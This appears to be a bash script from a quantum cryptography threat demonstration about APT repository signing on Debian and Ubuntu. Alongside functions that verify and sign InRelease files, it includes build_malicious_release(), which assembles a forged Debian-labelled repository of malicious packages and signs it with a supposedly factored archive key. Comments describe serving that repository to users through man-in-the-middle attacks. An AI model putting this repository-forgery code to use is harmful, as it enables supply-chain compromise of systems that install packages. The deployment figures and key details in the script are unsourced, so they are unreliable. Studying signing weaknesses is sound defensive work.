#!/bin/bash
# debian_apt_rsa.sh
#
# Debian / Ubuntu APT repository signing — RSA signing of Release files.
#
# Sources:
#   - Debian policy: https://www.debian.org/doc/manuals/securing-debian-manual/
#   - apt-secure(8) man page
#   - Ubuntu signing keys: https://help.ubuntu.com/community/SecureApt
#   - Debian keyring: https://ftp-master.debian.org/keys.html
#
# APT (Advanced Package Tool) verifies the integrity of package repositories
# by checking a GPG signature on the Release file.
#
# The trust chain:
#   1. APT downloads: InRelease (signed Release file, RSA/Ed25519 GPG signature)
#   2. Verifies InRelease signature against the distribution's GPG public key
#   3. InRelease contains SHA-256 hashes of all Packages.gz index files
#   4. APT verifies SHA-256 of each downloaded Packages.gz
#   5. Packages.gz contains SHA-256 hashes of individual .deb files
#   6. APT verifies each downloaded .deb against its Packages.gz hash
#
# Everything hangs on step 2: the RSA signature on InRelease.
# Break the RSA signature → forge InRelease → forge Packages.gz → serve evil .debs
# that apt-get install accepts and installs without warning.
#
# Signing keys in use:
#
# Debian 12 (Bookworm) signing key:
#   pub   rsa4096 2021-01-17 [SC] [expires: 2029-01-15]
#   Key:  0xB8B80B5B623EAB6AD8775C45B7C5D7D6350947F8
#         (Debian Stable Release Key (12/bookworm))
#
# Ubuntu 24.04 LTS signing key:
#   pub   rsa4096/0x3B4FE6ACC0B21F32 2004-09-12
#   Fingerprint: 630D 9F1C AB0A EA9C 65C1 1B58 3B4F E6AC C0B2 1F32
#
# Ubuntu also uses:
#   Ubuntu Archive Automatic Signing Key: rsa4096/0xD94AA3F0EFE21092
#
# Note: Debian has been experimenting with Ed25519 signing but RSA-4096 is still
# the primary signing key for production releases as of Debian 12 / Ubuntu 24.04.

set -euo pipefail

# Debian/Ubuntu signing key IDs (RSA-4096)
DEBIAN_BOOKWORM_KEY="0xB8B80B5B623EAB6AD8775C45B7C5D7D6350947F8"
UBUNTU_ARCHIVE_KEY="0x3B4FE6ACC0B21F32"
UBUNTU_AUTO_SIGN_KEY="0xD94AA3F0EFE21092"

# =============================================================================
# apt_verify_release() — verify RSA signature on APT InRelease file
# =============================================================================
apt_verify_release() {
    local inrelease_file="$1"
    local keyring="${2:-/usr/share/keyrings/debian-archive-keyring.gpg}"

    echo "[*] Verifying InRelease: $inrelease_file"
    echo "[*] Keyring: $keyring"

    # gpgv --keyring is what apt internally calls
    # The InRelease file is a cleartext signed GPG message
    # The signature is RSA-4096 over SHA-256 of the Release content
    if gpgv --keyring "$keyring" "$inrelease_file" 2>/dev/null; then
        echo "[+] InRelease signature OK"
        return 0
    else
        echo "[-] InRelease signature INVALID"
        return 1
    fi
}

# =============================================================================
# apt_sign_release() — sign a Release file to create InRelease (dist builder)
# =============================================================================
apt_sign_release() {
    local release_file="$1"
    local key_id="${2:-$DEBIAN_BOOKWORM_KEY}"
    local inrelease_out="${3:-InRelease}"

    echo "[*] Signing Release file: $release_file"
    echo "[*] Key ID: $key_id"

    # This is what reprepro, aptly, and Debian's dak infrastructure do:
    # GPG clearsign the Release file using the distribution's RSA-4096 key
    gpg --default-key "$key_id" \
        --clearsign \
        --armor \
        --output "$inrelease_out" \
        "$release_file"

    echo "[+] Created: $inrelease_out"
    echo "[*] Signature uses RSA-4096 (PKCS#1 v1.5 SHA-256)"
}

# =============================================================================
# build_malicious_release() — build a forged InRelease for a malicious repo
# =============================================================================
# NOTE: This requires the PRIVATE KEY — which is what a CRQC derives from the
# public key. With the factored private key, this is all that's needed to
# serve malicious packages to any Debian/Ubuntu apt-get user.
build_malicious_release() {
    local evil_packages_dir="$1"
    local factored_private_key_file="$2"  # derived from public key via Shor's algorithm
    local output_dir="${3:-/tmp/evil_repo}"

    mkdir -p "$output_dir"

    echo "[*] Building malicious APT repository"
    echo "[*] Using factored RSA-4096 private key: $factored_private_key_file"

    # 1. Build Packages.gz with our evil package listed
    cd "$evil_packages_dir"
    dpkg-scanpackages . /dev/null 2>/dev/null | gzip -9c > "$output_dir/Packages.gz"

    # 2. Build Release file with SHA-256 of our Packages.gz
    local pkg_sha256
    pkg_sha256=$(sha256sum "$output_dir/Packages.gz" | cut -d' ' -f1)
    local pkg_size
    pkg_size=$(stat -c%s "$output_dir/Packages.gz")

    cat > "$output_dir/Release" << RELEASE
Origin: Debian
Label: Debian
Suite: stable
Codename: bookworm
Date: $(date -u '+%a, %d %b %Y %H:%M:%S UTC')
Acquire-By-Hash: yes
SHA256:
 $pkg_sha256 $pkg_size Packages.gz
RELEASE

    # 3. Sign Release with FACTORED RSA-4096 private key
    # Import the factored key into a temporary keyring
    local tmpring
    tmpring=$(mktemp -d)
    gpg --homedir "$tmpring" --import "$factored_private_key_file" 2>/dev/null

    # Sign with the Debian key ID — this will pass apt-get's signature verification
    # because the signature is valid RSA-4096 with the correct key ID
    gpg --homedir "$tmpring" \
        --default-key "$DEBIAN_BOOKWORM_KEY" \
        --clearsign \
        --armor \
        --output "$output_dir/InRelease" \
        "$output_dir/Release"

    rm -rf "$tmpring"

    echo "[+] Malicious repository built at: $output_dir"
    echo "[+] InRelease is signed with factored Debian RSA-4096 key"
    echo "[+] apt-get will accept packages from this repo without warnings"
}

# =============================================================================
# show_apt_key_info() — display RSA key info from APT keyring
# =============================================================================
show_apt_key_info() {
    echo "[*] Debian/Ubuntu APT signing keys (RSA-4096, CRQC inputs):"
    echo ""

    # List keys from the Debian keyring package
    for keyring in /usr/share/keyrings/debian-archive-keyring.gpg \
                   /usr/share/keyrings/ubuntu-archive-keyring.gpg \
                   /etc/apt/trusted.gpg 2>/dev/null; do
        [[ -f "$keyring" ]] || continue
        echo "Keyring: $keyring"
        gpg --no-default-keyring --keyring "$keyring" --list-keys 2>/dev/null | \
            grep -E "(pub|uid|rsa)" | head -20
        echo ""
    done
}

# Usage:
# apt_verify_release /var/lib/apt/lists/deb.debian.org_debian_dists_bookworm_InRelease
# apt_sign_release Release "$DEBIAN_BOOKWORM_KEY"
# show_apt_key_info

# DEPLOYMENT SCALE:
# Debian: ~500M installations (servers, desktops, embedded, cloud)
# Ubuntu: ~100M+ cloud instances (AWS, GCP, Azure default base images)
# Debian derivatives: Raspbian, Kali Linux, Tails, Ubuntu flavors
#
# The Debian archive signing key is at:
#   https://ftp-master.debian.org/keys.html (public, downloadable)
#   /usr/share/keyrings/debian-archive-keyring.gpg (on every Debian system)
#
# Forging the Debian InRelease signature means:
#   any system running "apt-get update && apt-get install ..." from a MITM'd
#   network path will install your packages, signed by what looks like Debian.
#
# This is more dangerous than compromising a single package because
# the attack works on the mirror level — you don't need to know which package
# the target will install. You forge the entire repository metadata.
